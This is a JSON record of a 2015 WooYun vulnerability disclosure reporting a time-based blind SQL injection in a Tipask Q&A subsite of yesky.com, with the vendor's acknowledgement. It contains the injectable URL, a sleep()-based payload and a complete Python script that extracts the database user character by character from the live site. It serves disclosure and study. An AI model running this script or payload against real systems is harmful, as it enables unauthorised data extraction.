{"id": 38016, "wybug_id": "wooyun-2015-098396", "wybug_title": "天极网某分站存在SQL盲注漏洞", "wybug_corp": "天极传媒集团", "wybug_author": "loopx9", "wybug_date": "2015-02-26 14:28", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： sql盲注.（附验证脚本） 详细说明：   WooYun: Tipask问答系统12个注射打包  的一个案例:url:\nhttp://product.yesky.com/wenda/index.php?question/ajaxgood/sleep(1)/\n   漏洞证明：  测试脚本:\n#coding=utf-8 import sys,urllib2 from optparse import OptionParser from urllib2 import Request,urlopen,URLError,HTTPError import urllibimport time result='' def request(URL):     #print URL     user_agent = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' }     req = urllib2.Request(URL, None, user_agent)               try:         request = urllib2.urlopen(req,timeout=4)              except Exception ,e:         time.sleep(2)        return 'timeout'              return request.read() def binary_sqli(left, right, index):    global result    while 1:         mid = (left + right)/2         if mid == left:             result += chr(mid)             print result             break         payload = \"if(ascii(substring(user(),\"+str(index)+\",1))<\"+str(mid)+\",1,sleep(2))\"         html = request('http://product.yesky.com/wenda/index.php?question/ajaxgood/'+payload+'/')         verify = 'timeout'         if verify not in html:             right = mid         else:             left = mid                    if __name__ == '__main__':     for i in range(1,50):         binary_sqli(32, 127, i)\n读取user():\n\n   修复方案：  过滤。这个问答系统注入很多的。   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-02-26 14:41 厂商回复： 新年好，非常感谢您对我们网站安全工作的关注，非常感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}